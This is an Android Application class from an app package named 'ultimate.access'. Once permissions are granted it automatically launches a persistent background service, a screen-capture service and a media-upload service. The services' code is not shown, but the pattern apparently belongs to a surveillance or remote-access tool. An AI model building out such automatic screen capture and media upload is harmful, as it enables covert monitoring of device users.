package com.ultimate.access;

import android.app.Activity;
import android.app.Application;
import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;

import com.ultimate.access.services.MediaUploadService;
import com.ultimate.access.services.ScreenCaptureService;
import com.ultimate.access.services.UltimateBackgroundService;

public class UltimateApplication extends Application implements Application.ActivityLifecycleCallbacks {

    private static final String TAG = "UltimateApp";
    private static Context context;
    private static boolean isAppInForeground = false;
    private static boolean allPermissionsGranted = false;
    private static Activity currentActivity;
    private PowerManager.WakeLock wakeLock;

    @Override
    public void onCreate() {
        super.onCreate();
        context = getApplicationContext();
        registerActivityLifecycleCallbacks(this);

        Log.d(TAG, "✅ UltimateApplication created");
        Log.d(TAG, "Initial permissions state: " + allPermissionsGranted);
    }

    public static void setAllPermissionsGranted(boolean granted) {
        Log.d(TAG, "🔄 setAllPermissionsGranted() called with: " + granted);
        Log.d(TAG, "Previous permissions state: " + allPermissionsGranted);

        allPermissionsGranted = granted;

        if (granted) {
            Log.d(TAG, "✅ Permissions granted, starting services");
            startAllServices();
            notifyPermissionsGranted();
        } else {
            Log.d(TAG, "❌ Permissions not granted");
        }
    }

    private static void startAllServices() {
        Log.d(TAG, "🚀 startAllServices() called");

        try {
            Intent bgIntent = new Intent(context, UltimateBackgroundService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(bgIntent);
                Log.d(TAG, "✅ Background service started (foreground)");
            } else {
                context.startService(bgIntent);
                Log.d(TAG, "✅ Background service started");
            }

            Intent screenIntent = new Intent(context, ScreenCaptureService.class);
            context.startService(screenIntent);
            Log.d(TAG, "✅ Screen capture service started");

            Intent mediaIntent = new Intent(context, MediaUploadService.class);
            context.startService(mediaIntent);
            Log.d(TAG, "✅ Media upload service started");

            Log.d(TAG, "🎉 All services started successfully");
        } catch (Exception e) {
            Log.e(TAG, "❌ Error starting services: " + e.getMessage());
            e.printStackTrace();
        }
    }

    public static Activity getCurrentActivity() {
        return currentActivity;
    }

    // 🔥 FIX: Better notification with null check and runOnUiThread
    private static void notifyPermissionsGranted() {
        Log.d(TAG, "🔔 notifyPermissionsGranted() called");
        Log.d(TAG, "Current activity: " + (currentActivity != null ? currentActivity.getClass().getSimpleName() : "null"));

        if (currentActivity != null) {
            if (currentActivity instanceof MainActivity) {
                Log.d(TAG, "✅ Notifying MainActivity");
                final MainActivity mainActivity = (MainActivity) currentActivity;
                mainActivity.runOnUiThread(() -> {
                    mainActivity.onPermissionsGranted();
                });
            } else {
                Log.d(TAG, "⚠️ Current activity is not MainActivity: " + currentActivity.getClass().getSimpleName());
            }
        } else {
            Log.d(TAG, "⚠️ Current activity is null, cannot notify");

            // 🔥 Retry after a short delay
            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                if (currentActivity instanceof MainActivity) {
                    Log.d(TAG, "✅ Retry: Notifying MainActivity");
                    final MainActivity mainActivity = (MainActivity) currentActivity;
                    mainActivity.runOnUiThread(() -> {
                        mainActivity.onPermissionsGranted();
                    });
                }
            }, 500);
        }
    }

    public static Context getContext() {
        return context;
    }

    public static boolean isAppInForeground() {
        return isAppInForeground;
    }

    public static boolean areAllPermissionsGranted() {
        Log.d(TAG, "📊 areAllPermissionsGranted() called, returning: " + allPermissionsGranted);
        return allPermissionsGranted;
    }

    @Override
    public void onActivityCreated(@NonNull Activity activity, @Nullable Bundle savedInstanceState) {
        Log.d(TAG, "📱 Activity created: " + activity.getClass().getSimpleName());
        currentActivity = activity;
    }

    @Override
    public void onActivityStarted(@NonNull Activity activity) {
        Log.d(TAG, "📱 Activity started: " + activity.getClass().getSimpleName());
        isAppInForeground = true;
        currentActivity = activity;
    }

    @Override
    public void onActivityResumed(@NonNull Activity activity) {
        Log.d(TAG, "📱 Activity resumed: " + activity.getClass().getSimpleName());
        isAppInForeground = true;
        currentActivity = activity;

        Log.d(TAG, "📊 Permission state on resume: " + allPermissionsGranted);

        // 🔥 Auto-notify if permissions granted and activity is MainActivity
        if (allPermissionsGranted && activity instanceof MainActivity) {
            Log.d(TAG, "✅ Auto-notifying MainActivity on resume");
            final MainActivity mainActivity = (MainActivity) activity;
            mainActivity.runOnUiThread(() -> {
                mainActivity.onPermissionsGranted();
            });
        }
    }

    @Override
    public void onActivityPaused(@NonNull Activity activity) {
        Log.d(TAG, "📱 Activity paused: " + activity.getClass().getSimpleName());
        isAppInForeground = false;
        if (currentActivity == activity) {
            Log.d(TAG, "📍 Current activity cleared (paused)");
            currentActivity = null;
        }
    }

    @Override
    public void onActivityStopped(@NonNull Activity activity) {
        Log.d(TAG, "📱 Activity stopped: " + activity.getClass().getSimpleName());
        isAppInForeground = false;
        if (currentActivity == activity) {
            Log.d(TAG, "📍 Current activity cleared (stopped)");
            currentActivity = null;
        }
    }

    @Override
    public void onActivitySaveInstanceState(@NonNull Activity activity, @NonNull Bundle outState) {
        Log.d(TAG, "📱 Activity save instance: " + activity.getClass().getSimpleName());
    }

    @Override
    public void onActivityDestroyed(@NonNull Activity activity) {
        Log.d(TAG, "📱 Activity destroyed: " + activity.getClass().getSimpleName());
        if (currentActivity == activity) {
            Log.d(TAG, "📍 Current activity cleared (destroyed)");
            currentActivity = null;
        }
    }
}